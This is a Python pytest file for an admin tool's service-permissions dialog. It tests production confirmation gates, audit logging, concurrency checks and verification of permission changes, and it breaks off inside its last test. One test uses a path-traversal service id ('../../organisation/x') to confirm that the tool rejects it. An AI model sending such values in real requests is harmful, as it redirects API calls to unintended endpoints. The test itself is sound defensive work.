async def test_sync_for_environment_passes_encryption_to_sync_manager(initialized_db, mock_config):
    original_config = _st.config
    original_state = _st.state
    original_encryption = _st.encryption
    _st.config = mock_config
    _st.config.use_mock_api = True
    _st.state = _make_sync_test_state()
    _st.encryption = MagicMock()
    mock_sync_label = MagicMock()
    mock_sync_label.text = ""

    try:
        with (
            patch.object(_st, "ensure_admin_auth", new_callable=AsyncMock, return_value=True),
            patch.object(_st, "build_api_client", new_callable=AsyncMock, return_value=AsyncMock()) as mock_build,
            patch("app.ui.sync_handlers.SyncManager") as mock_sync_manager_cls,
        ):
            from app.sync import SyncProgress, SyncResult

            mock_manager = MagicMock()
            ok_result = SyncResult()
            ok_result.add_success()
            mock_manager.sync_users = AsyncMock(return_value=ok_result)
            mock_sync_manager_cls.return_value = mock_manager

            result = await sync_handlers._sync_for_environment(
                "development",
                ["sync_users"],
                mock_sync_label,
                SyncProgress(AsyncMock()),
            )

        assert result.success_count == 1
        mock_build.assert_awaited_once_with("development")
        mock_sync_manager_cls.assert_called_once_with(
            mock_build.return_value,
            _st.config.max_concurrency,
            environment="development",
            encryption=_st.encryption,
        )
    finally:
        _st.config = original_config
        _st.state = original_state
        _st.encryption = original_encryption


# ===================================================================
# services_table with search query to cover line 889
# ===================================================================


@pytest.mark.asyncio
async def test_services_table_with_search_query(initialized_db, mock_config):
    """Test services_table filtering when service_search_query is set."""

    original = _st.config
    original_state = _st.state
    _st.config = mock_config
    _st.state = SharedTestState(environment="development")
    _st.service_search_query = "test-service"

    mock_obj = MagicMock()
    mock_obj.__enter__ = Mock(return_value=mock_obj)
    mock_obj.__exit__ = Mock(return_value=False)
    mock_obj.classes = MagicMock(return_value=mock_obj)
    mock_obj.props = MagicMock(return_value=mock_obj)
    mock_obj.add_slot = MagicMock(return_value=mock_obj)
    mock_obj.on = MagicMock(return_value=mock_obj)

    try:
        with (
            patch(
                "app.ui.pages.services.list_services",
                new_callable=AsyncMock,
                return_value=[],
            ),
            patch(
                "app.ui.pages.services.count_active_api_keys_by_service",
                new_callable=AsyncMock,
                return_value={},
            ),
            patch("app.ui.pages.services.ui.table", return_value=mock_obj),
            patch("app.ui.pages.services.ui.row", return_value=mock_obj),
            patch("app.ui.pages.services.ui.button", return_value=mock_obj),
            patch("app.ui.pages.services.ui.space"),
            patch("app.ui.pages.services.add_copyable_slots"),
            patch("app.ui.pages.services.add_export_button"),
        ):
            await page_services.services_table.func(lambda: None)
    finally:
        _st.config = original
        _st.state = original_state
        _st.service_search_query = ""


class TestRawBaseUrlAndProtection:
    @pytest.mark.asyncio
    async def test_raw_base_url_falls_back_to_config(self, initialized_db):
        with patch.object(_st.config, "api_hosts", {"production": "https://api.notifications.va.gov"}):
            assert await _st.get_raw_base_url("production") == "https://api.notifications.va.gov"

    @pytest.mark.asyncio
    async def test_raw_base_url_prefers_the_db_setting(self, initialized_db):
        from app.repository import set_setting

        await set_setting("base_url_production", "https://override.example.com")
        with patch.object(_st.config, "api_hosts", {"production": "https://api.notifications.va.gov"}):
            assert await _st.get_raw_base_url("production") == "https://override.example.com"

    @pytest.mark.asyncio
    async def test_raw_base_url_is_not_container_remapped(self, initialized_db):
        with (
            patch.object(_st.config, "api_hosts", {"local": "http://localhost:6011"}),
            patch.object(_st.config, "container_host", "host.docker.internal"),
        ):
            assert await _st.get_raw_base_url("local") == "http://localhost:6011"

    @pytest.mark.asyncio
    async def test_raw_base_url_missing(self, initialized_db):
        with patch.object(_st.config, "api_hosts", {}):
            assert await _st.get_raw_base_url("nope") is None

    @pytest.mark.asyncio
    async def test_is_env_protected_true_for_production(self, initialized_db):
        with patch.object(_st.config, "non_production_environments", DEFAULT_NON_PRODUCTION_ENVIRONMENTS):
            assert await _st.is_env_protected("production") is True

    @pytest.mark.asyncio
    async def test_is_env_protected_false_for_a_listed_environment(self, initialized_db):
        with patch.object(_st.config, "non_production_environments", DEFAULT_NON_PRODUCTION_ENVIRONMENTS):
            assert await _st.is_env_protected("development") is False

    @pytest.mark.asyncio
    async def test_is_env_protected_fails_closed_on_an_unlisted_environment(self, initialized_db):
        with patch.object(_st.config, "non_production_environments", DEFAULT_NON_PRODUCTION_ENVIRONMENTS):
            assert await _st.is_env_protected("mystery") is True

    @pytest.mark.asyncio
    async def test_is_env_protected_reads_the_configured_allowlist(self, initialized_db):
        with patch.object(_st.config, "non_production_environments", {"qa"}):
            assert await _st.is_env_protected("qa") is False
            assert await _st.is_env_protected("development") is True

    @pytest.mark.asyncio
    async def test_is_env_protected_ignores_the_base_url_entirely(self, initialized_db):
        """H1 regression, at the state layer.

        A GovCloud production API reached through an SSH or ``kubectl port-forward``
        tunnel answers on localhost. The previous implementation read the base URL and
        returned False here, deleting the whole CRITICAL confirmation gate. The URL is
        now irrelevant: ``gov`` is not on the allowlist, so it stays protected.
        """
        from app.repository import set_setting

        await set_setting("base_url_gov", "http://localhost:6011")
        with patch.object(_st.config, "non_production_environments", DEFAULT_NON_PRODUCTION_ENVIRONMENTS):
            assert await _st.get_raw_base_url("gov") == "http://localhost:6011"
            assert await _st.is_env_protected("gov") is True

    @pytest.mark.asyncio
    async def test_is_env_protected_does_not_consult_use_mock_api(self, initialized_db):
        """Mock mode must not disarm the CRITICAL path, or it can never be rehearsed."""
        with (
            patch.object(_st.config, "non_production_environments", DEFAULT_NON_PRODUCTION_ENVIRONMENTS),
            patch.object(_st.config, "use_mock_api", True),
        ):
            assert await _st.is_env_protected("production") is True
            assert await _st.is_env_protected("development") is False


@pytest.mark.asyncio
async def test_services_table_renders_permissions_untruncated(initialized_db, mock_config):
    """The permissions cell must be the full, readable list.

    The other services_table tests feed list_services an empty list, so the row-mapping
    comprehension never executes -- statement coverage of that block is an illusion.
    """
    original = _st.config
    original_state = _st.state
    _st.config = mock_config
    _st.state = SharedTestState(environment="development")
    _st.service_search_query = ""

    permission_values = ["email", "sms", "international_sms", "letter", "inbound_sms"]
    raw = json.dumps(permission_values)
    assert len(raw) > 50, "fixture must exceed the old 50-character truncation threshold"

    row = SimpleNamespace(
        id="svc-1",
        environment="development",
        name="VEText",
        active=True,
        restricted=False,
        message_limit=1000,
        rate_limit=100,
        research_mode=False,
        count_as_live=True,
        permissions=raw,
    )

    captured: list = []

    mock_obj = MagicMock()
    mock_obj.__enter__ = Mock(return_value=mock_obj)
    mock_obj.__exit__ = Mock(return_value=False)
    mock_obj.classes = MagicMock(return_value=mock_obj)
    mock_obj.props = MagicMock(return_value=mock_obj)
    mock_obj.add_slot = MagicMock(return_value=mock_obj)
    mock_obj.on = MagicMock(return_value=mock_obj)

    try:
        with (
            patch("app.ui.pages.services.list_services", new_callable=AsyncMock, return_value=[row]),
            patch(
                "app.ui.pages.services.count_active_api_keys_by_service",
                new_callable=AsyncMock,
                return_value={},
            ),
            patch("app.ui.pages.services.count_templates_by_service", new_callable=AsyncMock, return_value={}),
            patch("app.ui.pages.services.ui.table", return_value=mock_obj),
            patch("app.ui.pages.services.ui.row", return_value=mock_obj),
            patch("app.ui.pages.services.ui.button", return_value=mock_obj),
            patch("app.ui.pages.services.ui.space"),
            patch("app.ui.pages.services.add_copyable_slots"),
            patch("app.ui.pages.services.add_export_button", side_effect=lambda rows, *a, **k: captured.extend(rows)),
        ):
            await page_services.services_table.func(lambda: None)
    finally:
        _st.config = original
        _st.state = original_state
        _st.service_search_query = ""

    assert captured[0]["permissions"] == "email, sms, international_sms, letter, inbound_sms"


# ---------------------------------------------------------------------------
# Edit Service Permissions dialog
#
# Every closure in the dialog carries `# pragma: no cover`, so a green coverage
# number on app/ui/pages/services.py says nothing about whether these paths run.
# The harness below reaches them for real: it captures the callables that
# services_page wires to its widgets and invokes them, so the assertions pin
# behavior rather than statement execution.
# ---------------------------------------------------------------------------


class _ValueMock(MagicMock):
    """A MagicMock whose ``.value`` assignment behaves like a real NiceGUI element.

    ``nicegui/binding.py:146-155`` invokes the change handler inline, synchronously, and
    only when the new value actually differs. A plain MagicMock silently skips all of
    that, which hides exactly the re-entrancy bugs this dialog can have: closures that
    blank ``perms_challenge_input.value`` re-enter ``refresh_permission_ui`` through the
    change handler, and the "only on change" rule is the sole reason that terminates.
    """

    @property
    def value(self):
        return self.__dict__.get("_value")

    @value.setter
    def value(self, new):
        old = self.__dict__.get("_value")
        self.__dict__["_value"] = new
        if old == new:
            return
        for handler in self.__dict__.get("_change_handlers", []):
            handler(SimpleNamespace(value=new, sender=self))


class _WidgetProbe:
    """Recording stand-ins for the NiceGUI elements services_page builds."""

    def __init__(self):
        self.widgets: dict = {}
        self.events: dict = {}

    def factory(self, kind):
        def make(*args, **kwargs):
            m = _ValueMock()
            m.__dict__["_change_handlers"] = []
            m.__enter__ = Mock(return_value=m)
            m.__exit__ = Mock(return_value=False)
            m.classes = MagicMock(return_value=m)
            m.props = MagicMock(return_value=m)
            m.style = MagicMock(return_value=m)
            m.add_slot = MagicMock(return_value=m)
            m.on_click = MagicMock(return_value=m)
            m.value = kwargs.get("value")
            m.text = ""
            m.init_args = args
            m.init_kwargs = kwargs

            def _on_value_change(handler):
                m.__dict__["_change_handlers"].append(handler)
                return m

            def _on(event, handler=None, *a, **k):
                if handler is not None:
                    self.events.setdefault(event, []).append(handler)
                    # Also recorded per-widget: two dialogs now listen for "hide" and
                    # they must do different things, so a flat by-event list cannot say
                    # which handler belongs to which.
                    m.__dict__.setdefault("_event_handlers", {}).setdefault(event, []).append(handler)
                return m

            m.on_value_change = MagicMock(side_effect=_on_value_change)
            m.on = MagicMock(side_effect=_on)
            self.widgets.setdefault(kind, []).append(m)
            return m

        return make

    def of_kind(self, kind):
        return self.widgets.get(kind, [])

    def first_arg_labels(self, kind):
        return [w.init_args[0] if w.init_args else None for w in self.of_kind(kind)]

    def all_starting_with(self, kind, prefix):
        return [
            w
            for w in self.of_kind(kind)
            if w.init_args and isinstance(w.init_args[0], str) and w.init_args[0].startswith(prefix)
        ]

    def widget_starting_with(self, kind, prefix):
        found = self.all_starting_with(kind, prefix)
        if not found:
            raise AssertionError(f"no {kind} whose label starts with {prefix!r}; had {self.first_arg_labels(kind)}")
        return found[0]

    def change_handler(self, kind, prefix):
        widget = self.widget_starting_with(kind, prefix)
        assert widget.on_value_change.call_args is not None, f"{prefix!r} has no change handler"
        return widget.on_value_change.call_args.args[0]


@contextmanager
def _permissions_probe():
    """services_page under recording widgets. Yields the probe plus the ui.notify mock."""
    from contextlib import ExitStack

    probe = _WidgetProbe()
    kinds = (
        "label",
        "button",
        "checkbox",
        "input",
        "number",
        "column",
        "card",
        "row",
        "dialog",
        "separator",
        "space",
    )
    with mock_page_ui("app.ui.pages.services"), ExitStack() as stack:
        for kind in kinds:
            stack.enter_context(patch(f"app.ui.pages.services.ui.{kind}", side_effect=probe.factory(kind)))
        probe.notify = stack.enter_context(patch("app.ui.pages.services.ui.notify"))
        yield probe


def _notify_texts(notify_mock):
    return [c.args[0] if c.args else "" for c in notify_mock.call_args_list]


def _handlers_for(widget, event):
    return widget.__dict__.get("_event_handlers", {}).get(event, [])


def _pending_permission_change(dialog):
    """The dialog's stash of the approved diff.

    It is a closure local, reached here through the bound ``dict.clear`` the page
    registers as the final dialog's hide handler. Deliberately not exposed by production
    code just for tests.
    """
    return _handlers_for(dialog.final_dialog, "hide")[0].__self__


async def _build_permissions_dialog(probe, *, api, protected=False, service=None, base_url="https://dev-notify.va.gov"):
    """Run services_page and return the wired-up pieces of the permissions dialog."""
    svc = service or {
        "id": "svc-1",
        "environment_value": "development",
        "name": "VEText",
        "_row_key": "svc-1|development",
    }
    with (
        patch.object(page_services, "services_table", new_callable=AsyncMock) as table,
        patch("app.ui.pages.services.ensure_admin_auth", new_callable=AsyncMock, return_value=True),
        patch("app.ui.pages.services.build_api_client", new_callable=AsyncMock, return_value=api),
        patch("app.ui.pages.services.is_env_protected", new_callable=AsyncMock, return_value=protected),
        patch("app.ui.pages.services.get_raw_base_url", new_callable=AsyncMock, return_value=base_url),
        patch(
            "app.ui.pages.services.write_permission_audit",
            return_value="data/permission_changes/permission_change_x.json",
        ) as write_audit,
        patch("app.ui.pages.services.rewrite_json_artifact") as rewrite_audit,
        patch("app.ui.pages.services.update_service_permissions_cache", new_callable=AsyncMock) as cache_write,
    ):
        await page_services.services_page()
        selected_service = table.call_args.args[1]
        open_handler = table.call_args.args[3]
        selected_service.update(svc)
        yield SimpleNamespace(
            table=table,
            selected_service=selected_service,
            open_dialog=open_handler,
            submit=probe.widget_starting_with("button", "No changes").on_click.call_args.args[0],
            execute=probe.widget_starting_with("button", "Execute Change").on_click.call_args.args[0],
            perms_dialog=probe.of_kind("dialog")[1],
            final_dialog=probe.of_kind("dialog")[2],
            submit_button=probe.widget_starting_with("button", "No changes"),
            cancel=probe.all_starting_with("button", "Cancel")[0].on_click.call_args.args[0],
            final_cancel=probe.all_starting_with("button", "Cancel")[1].on_click.call_args.args[0],
            challenge_input=probe.of_kind("input")[0],
            write_audit=write_audit,
            rewrite_audit=rewrite_audit,
            cache_write=cache_write,
        )


@contextmanager
def _services_state(mock_config):
    original, original_state = _st.config, _st.state
    _st.config = mock_config
    _st.state = SharedTestState(environment="development")
    _st.service_search_query = ""
    try:
        yield
    finally:
        _st.config = original
        _st.state = original_state
        _st.service_search_query = ""


def _service_body(permissions, service_id="svc-1", name="VEText"):
    return {"id": service_id, "name": name, "permissions": permissions}


@pytest.mark.asyncio
async def test_services_table_permissions_button_is_conditional(initialized_db, mock_config):
    """The Edit Permissions button appears only when services_table is given a handler.

    services_table is also reached with on_permissions_click=None from any caller that
    renders a read-only table, and a destructive button leaking into that view is the
    failure this pins.
    """
    with _services_state(mock_config):
        probe = _WidgetProbe()
        on_permissions = lambda: None  # noqa: E731

        async def render(**kwargs):
            probe.widgets.clear()
            with (
                patch("app.ui.pages.services.list_services", new_callable=AsyncMock, return_value=[]),
                patch(
                    "app.ui.pages.services.count_active_api_keys_by_service",
                    new_callable=AsyncMock,
                    return_value={},
                ),
                patch("app.ui.pages.services.count_templates_by_service", new_callable=AsyncMock, return_value={}),
                patch("app.ui.pages.services.ui.table", side_effect=probe.factory("table")),
                patch("app.ui.pages.services.ui.row", side_effect=probe.factory("row")),
                patch("app.ui.pages.services.ui.button", side_effect=probe.factory("button")),
                patch("app.ui.pages.services.ui.space"),
                patch("app.ui.pages.services.add_copyable_slots"),
                patch("app.ui.pages.services.add_export_button"),
            ):
                await page_services.services_table.func(lambda: None, **kwargs)

        await render()
        assert "Edit Permissions" not in probe.first_arg_labels("button")

        await render(on_permissions_click=on_permissions)
        assert "Edit Permissions" in probe.first_arg_labels("button")
        button = probe.widget_starting_with("button", "Edit Permissions")
        assert button.init_kwargs["on_click"] is on_permissions
        assert button.init_kwargs["color"] == "warning"


@pytest.mark.asyncio
async def test_services_page_passes_permissions_handler_to_table(initialized_db, mock_config):
    """services_page must hand its own open-dialog closure to services_table."""
    with _services_state(mock_config), _permissions_probe():
        with patch.object(page_services, "services_table", new_callable=AsyncMock) as table:
            await page_services.services_page()
        handler = table.call_args.args[3]
        assert handler.__name__ == "handle_open_permissions_dialog"


@pytest.mark.asyncio
async def test_permissions_dialog_requires_a_selected_service(initialized_db, mock_config):
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        async for dialog in _build_permissions_dialog(probe, api=api):
            dialog.selected_service.clear()
            await dialog.open_dialog()
        assert "Select a service from the table first" in _notify_texts(probe.notify)
        api.get_service.assert_not_called()


@pytest.mark.asyncio
async def test_permissions_dialog_reports_malformed_permissions_instead_of_doing_nothing(initialized_db, mock_config):
    """A str permissions value must surface an error, not a silent no-op.

    normalize_permissions raises TypeError on a str rather than returning ['e','m',...].
    nicegui.events.handle_event swallows that exception into app.handle_exception, and
    this app registers no exception handler, so an unguarded call would leave the
    operator clicking a button that does nothing.
    """
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        api.get_service.return_value = _service_body("email,sms")
        async for dialog in _build_permissions_dialog(probe, api=api):
            await dialog.open_dialog()
        texts = _notify_texts(probe.notify)
        assert any("malformed permissions value" in t and "got str" in t for t in texts), texts
        dialog.perms_dialog.open.assert_not_called()


@pytest.mark.asyncio
async def test_permissions_dialog_stops_when_api_returns_a_different_service(initialized_db, mock_config):
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        api.get_service.return_value = _service_body(["email"], service_id="other-svc")
        async for dialog in _build_permissions_dialog(probe, api=api):
            await dialog.open_dialog()
        assert any("returned service other-svc" in t for t in _notify_texts(probe.notify))
        dialog.perms_dialog.open.assert_not_called()


@pytest.mark.asyncio
async def test_permissions_dialog_stops_when_the_response_has_no_permissions_key(initialized_db, mock_config):
    """A missing key is not an empty set, and conflating them is a silent full wipe.

    The trace: a production service holds ["email", "sms", "international_sms"], the
    response carries the right id but no "permissions" key, `.get()` yields None,
    normalize_permissions(None) yields [], every box renders unticked. Ticking `email`
    then computes removed=() -- tier ELEVATED, so no typed challenge, no acknowledgements,
    no final dialog -- and the replace-everything POST destroys the other two. The verify
    read agrees, because the service really does hold only `email` by then, so the
    operator is shown a green success and the audit's `before` (the rollback value) is [].
    """
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        api.get_service.return_value = {"id": "svc-1", "name": "VEText"}
        async for dialog in _build_permissions_dialog(probe, api=api, protected=True):
            await dialog.open_dialog()
        texts = _notify_texts(probe.notify)
        assert any("no 'permissions' key" in t for t in texts), texts
        dialog.perms_dialog.open.assert_not_called()
        assert not probe.of_kind("checkbox"), "no editor may be built from an unknown permission set"


@pytest.mark.asyncio
async def test_permissions_dialog_stops_on_a_non_string_permission_element(initialized_db, mock_config):
    """Strict normalization on the read path: a bad element must stop, not be filtered.

    Filtering is fail-open in the worst direction. ["email", "sms", 0] silently becomes
    ("email", "sms"), so the 0 appears in no diff entry, earns no acknowledgement, and is
    destroyed by the POST with LESS friction than a change the operator can see.
    """
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        api.get_service.return_value = _service_body(["email", "sms", 0])
        async for dialog in _build_permissions_dialog(probe, api=api):
            await dialog.open_dialog()
        texts = _notify_texts(probe.notify)
        assert any("malformed permissions value" in t and "not str" in t for t in texts), texts
        dialog.perms_dialog.open.assert_not_called()


@pytest.mark.asyncio
async def test_permissions_dialog_refuses_a_service_id_that_is_not_a_url_path_segment(initialized_db, mock_config):
    """The id comes from the sync cache, i.e. from the API, and lands in the request URL.

    httpx resolves dot segments against the base URL, so this would not 404 -- it would
    retarget the POST at an endpoint nobody chose.
    """
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        svc = {
            "id": "../../organisation/x",
            "environment_value": "development",
            "name": "VEText",
            "_row_key": "x|development",
        }
        async for dialog in _build_permissions_dialog(probe, api=api, service=svc):
            await dialog.open_dialog()
        assert any("not a safe URL path segment" in t for t in _notify_texts(probe.notify))
        api.get_service.assert_not_called()


@pytest.mark.asyncio
async def test_permissions_concurrency_reread_refuses_an_unparseable_body(initialized_db, mock_config):
    """get_service returns {} for a non-dict body, which used to read as "no permissions".

    With an empty diff.before that made the staleness gate pass on a garbage response.
    """
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        api.get_service.side_effect = [_service_body([]), {}]
        async for dialog in _build_permissions_dialog(probe, api=api):
            await dialog.open_dialog()
            probe.change_handler("checkbox", "SMS notifications")(SimpleNamespace(value=True))
            await dialog.submit()

        api.update_service_permissions.assert_not_awaited()
        dialog.write_audit.assert_not_called()
        assert any("Unusable response re-reading" in t for t in _notify_texts(probe.notify))


@pytest.mark.asyncio
async def test_permissions_verification_refuses_an_unparseable_body_when_clearing_everything(
    initialized_db, mock_config
):
    """The false-success case: an unparseable verify read while clearing all permissions.

    get_service returns {} for a non-dict body, so verified was []; clearing everything
    makes diff.after () as well, and permissions_equal([], ()) is True. The most
    destructive operation this tool performs was reported "updated and verified" and
    recorded outcome "success" on a response nobody could parse -- and that same [] was
    written into the local permissions cache.
    """
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        api.get_service.side_effect = [_service_body(["email"]), _service_body(["email"]), {}]
        async for dialog in _build_permissions_dialog(probe, api=api):
            await dialog.open_dialog()
            probe.change_handler("checkbox", "Email notifications")(SimpleNamespace(value=False))
            await dialog.submit()

        api.update_service_permissions.assert_awaited_once_with("svc-1", [])
        texts = _notify_texts(probe.notify)
        assert not any("updated and verified" in t for t in texts), texts
        assert any("verification response is unusable" in t for t in texts), texts
        assert dialog.rewrite_audit.call_args.args[1]["outcome"] == "error"
        dialog.cache_write.assert_not_awaited()


@pytest.mark.asyncio
async def test_permissions_dialog_offers_every_known_permission_plus_unknown_live_values(initialized_db, mock_config):
    """The union matters: a live value missing from the checkbox list would be deleted."""
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        api.get_service.return_value = _service_body(["email", "letter"])
        async for dialog in _build_permissions_dialog(probe, api=api):
            await dialog.open_dialog()
        labels = probe.first_arg_labels("checkbox")
        assert "Email notifications" in labels
        assert "Scheduled notifications  (currently unsupported by the API)" in labels
        assert "letter  (unrecognized -- not documented by the API)" in labels
        assert probe.widget_starting_with("checkbox", "letter").init_kwargs["value"] is True
        assert probe.widget_starting_with("checkbox", "SMS notifications").init_kwargs["value"] is False
        dialog.perms_dialog.open.assert_called_once()


@pytest.mark.asyncio
async def test_permissions_additive_change_sends_full_replacement_set(initialized_db, mock_config):
    """The request body is the whole intended set, not just the delta."""
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        api.get_service.side_effect = [
            _service_body(["email"]),
            _service_body(["email"]),
            _service_body(["email", "sms"]),
        ]
        async for dialog in _build_permissions_dialog(probe, api=api):
            await dialog.open_dialog()
            probe.change_handler("checkbox", "SMS notifications")(SimpleNamespace(value=True))
            # T1: not protected, additive only. The submit button must NOT be red -- if it
            # is red here it is red everywhere, and a production removal looks identical.
            assert dialog.submit_button.props.call_args.args[0] == "color=primary"
            await dialog.submit()

        api.update_service_permissions.assert_awaited_once_with("svc-1", ["email", "sms"])
        # The rollback record is written before the request, with the pre-change set.
        attempted = dialog.write_audit.call_args.args[0]
        assert attempted["outcome"] == "attempted"
        assert attempted["before"] == ["email"]
        assert attempted["after"] == ["email", "sms"]
        final = dialog.rewrite_audit.call_args.args[1]
        assert final["outcome"] == "success"
        assert final["verified"] == ["email", "sms"]
        dialog.cache_write.assert_awaited_once_with(
            service_id="svc-1", permissions=["email", "sms"], environment="development"
        )
        # A non-production addition must not require the final dialog.
        dialog.final_dialog.open.assert_not_called()


@pytest.mark.asyncio
async def test_permissions_change_aborts_when_service_changed_since_dialog_opened(initialized_db, mock_config):
    """Concurrency re-check: nothing is sent and no audit record is created."""
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        api.get_service.side_effect = [
            _service_body(["email"]),
            _service_body(["email", "push"]),
        ]
        async for dialog in _build_permissions_dialog(probe, api=api):
            await dialog.open_dialog()
            probe.change_handler("checkbox", "SMS notifications")(SimpleNamespace(value=True))
            await dialog.submit()

        api.update_service_permissions.assert_not_awaited()
        dialog.write_audit.assert_not_called()
        assert any("changed since this dialog was opened" in t for t in _notify_texts(probe.notify))


@pytest.mark.asyncio
async def test_permissions_verification_mismatch_is_recorded_and_reported(initialized_db, mock_config):
    """A 2xx is not proof. The verify read decides the recorded outcome."""
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        api.get_service.side_effect = [
            _service_body(["email"]),
            _service_body(["email"]),
            _service_body(["email"]),
        ]
        async for dialog in _build_permissions_dialog(probe, api=api):
            await dialog.open_dialog()
            probe.change_handler("checkbox", "SMS notifications")(SimpleNamespace(value=True))
            await dialog.submit()

        api.update_service_permissions.assert_awaited_once()
        final = dialog.rewrite_audit.call_args.args[1]
        assert final["outcome"] == "mismatch"
        assert final["verified"] == ["email"]
        assert any("VERIFICATION MISMATCH" in t for t in _notify_texts(probe.notify))


@pytest.mark.asyncio
async def test_permissions_http_error_records_error_outcome_and_leaves_rollback_value(initialized_db, mock_config):
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        api.get_service.side_effect = [_service_body(["email"]), _service_body(["email"])]
        api.update_service_permissions.side_effect = httpx.HTTPStatusError(
            "boom",
            request=httpx.Request("POST", "https://example.test/service/svc-1"),
            response=httpx.Response(500, json={"message": "internal"}),
        )
        async for dialog in _build_permissions_dialog(probe, api=api):
            await dialog.open_dialog()
            probe.change_handler("checkbox", "SMS notifications")(SimpleNamespace(value=True))
            await dialog.submit()

        assert any("Do NOT retry" in t for t in _notify_texts(probe.notify))
        final = dialog.rewrite_audit.call_args.args[1]
        assert final["outcome"] == "error"
        assert final["before"] == ["email"]
        dialog.cache_write.assert_not_awaited()


@pytest.mark.asyncio
async def test_production_removal_is_gated_by_typed_name_and_acknowledgements(initialized_db, mock_config):
    """The CRITICAL tier must block submit until both halves of the challenge are done."""
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        api.get_service.side_effect = [
            _service_body(["email", "sms"]),
            _service_body(["email", "sms"]),
            _service_body(["email"]),
        ]
        async for dialog in _build_permissions_dialog(probe, api=api, protected=True):
            await dialog.open_dialog()
            probe.change_handler("checkbox", "SMS notifications")(SimpleNamespace(value=False))

            # An acknowledgement checkbox was raised for the removed value.
            ack = probe.widget_starting_with("checkbox", "I confirm removing 'sms'")

            # Neither half done: submit refuses and the final dialog stays shut.
            await dialog.submit()
            assert "Complete the confirmation before continuing" in _notify_texts(probe.notify)
            dialog.final_dialog.open.assert_not_called()

            # Typed name alone is not enough.
            dialog.challenge_input.value = "VEText"
            await dialog.submit()
            dialog.final_dialog.open.assert_not_called()

            # Both halves done: the final dialog opens, and only then does anything send.
            ack.value = True
            await dialog.submit()
            dialog.final_dialog.open.assert_called_once()
            api.update_service_permissions.assert_not_awaited()

            await dialog.execute()

        api.update_service_permissions.assert_awaited_once_with("svc-1", ["email"])
        assert dialog.write_audit.call_args.args[0]["protected"] is True
        assert dialog.rewrite_audit.call_args.args[1]["outcome"] == "success"


@pytest.mark.asyncio
async def test_permissions_final_execute_without_an_approved_diff_sends_nothing(initialized_db, mock_config):
    """Execute must never fall back to recomputing the diff it was meant to replay."""
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        async for dialog in _build_permissions_dialog(probe, api=api):
            await dialog.execute()
        assert "The approved change was lost. Reopen the dialog." in _notify_texts(probe.notify)
        api.update_service_permissions.assert_not_awaited()


@pytest.mark.asyncio
async def test_dismissing_the_permissions_dialog_clears_state(initialized_db, mock_config):
    """ESC and backdrop dismissal never reach Cancel, so the hide listener must clear."""
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        api.get_service.return_value = _service_body(["email"])
        async for dialog in _build_permissions_dialog(probe, api=api):
            await dialog.open_dialog()
            handlers = _handlers_for(dialog.perms_dialog, "hide")
            assert len(handlers) == 1, "the permissions dialog must listen for hide"
            handlers[0]()
            # Context is gone, so a subsequent submit cannot send anything.
            await dialog.submit()
        assert "No permission changes selected" in _notify_texts(probe.notify)
        api.update_service_permissions.assert_not_awaited()


@pytest.mark.asyncio
async def test_cancelling_the_final_dialog_leaves_the_outer_dialog_state_intact(initialized_db, mock_config):
    """Dismissing the final dialog drops the approved diff and nothing else.

    The outer dialog's state must survive: if backing out of the last confirmation also
    cleared it, the operator would silently lose their checkbox selections and typed
    challenge. The approval itself must NOT survive -- an approval that outlives the
    dialog which displayed it is a diff that can be executed without being re-shown --
    but re-approving is one click, because the outer state is still there.
    """
    with _services_state(mock_config), _permissions_probe() as probe:
        api = AsyncMock()
        api.get_service.side_effect = [
            _service_body(["email", "sms"]),
            _service_body(["email", "sms"]),
            _service_body(["email"]),
        ]
        async for dialog in _build_permissions_dialog(probe, api=api, protected=True):
            await dialog.open_dialog()
            probe.change_handler("checkbox", "SMS notifications")(SimpleNamespace(value=False))
            dialog.challenge_input.value = "VEText"
            probe.widget_starting_with("checkbox", "I confirm removing 'sms'").value = True
            await dialog.submit()
            dialog.final_dialog.open.assert_called_once()

            # The final dialog's Cancel is wired straight to its own close, nothing else.
            assert dialog.final_cancel is dialog.final_dialog.close
            dialog.final_cancel()
            # close() only pushes a prop update; Quasar's "hide" round-trips separately.
            final_hide = _handlers_for(dialog.final_dialog, "hide")
            assert len(final_hide) == 1, "the final dialog must listen for hide"
            final_hide[0]()

            # The approval is gone.
            await dialog.execute()
            assert "The approved change was lost. Reopen the dialog." in _notify_texts(probe.notify)
            api.update_service_permissions.assert_not_awaited()

            # But the operator's work is not: one click re-approves and re-opens.
            await dialog.submit()
            assert dialog.final_dialog.open.call_count == 2
            await dialog.execute()

        api.update_service_permissions.assert_awaited_once_with("svc-1", ["email"])


@pytest.mark.asyncio
async def test_execute_refuses_a_stashed_diff_that_no_longer_passes_the_gate(initialized_db, mock_config):
    """The last click before a production wipe re-derives the tier and re-tests the gate.

    Safe today only because the final dialog has one opener and the stash is written only
    after the gate passed. This pins that a tampered or stale stash cannot be executed.
    """
    with _services_state(mock_config), _permissions_probe() as probe:
        from app.ui.permission_helpers import diff_permissions

        api = AsyncMock()
        api.get_service.side_effect = [
            _service_body(["email", "sms"]),
            _service_body(["email", "sms"]),
            _service_body(["email"]),
        ]
        async for dialog in _build_permissions_dialog(probe, api=api, protected=True):
            await dialog.open_dialog()
            probe.change_handler("checkbox", "SMS notifications")(SimpleNamespace(value=False))
            dialog.challenge_input.value = "VEText"
            probe.widget_starting_with("checkbox", "I confirm removing 'sms'").value = True
            await dialog.submit()
            dialog.final_dialog.open.assert_called_once()

            # Swap the approved diff for a wider one the operator never acknowledged.
            _pending_permission_change(dialog)["diff"] = diff_permissions(["email", "sms"], [])

            await dialog.execute()

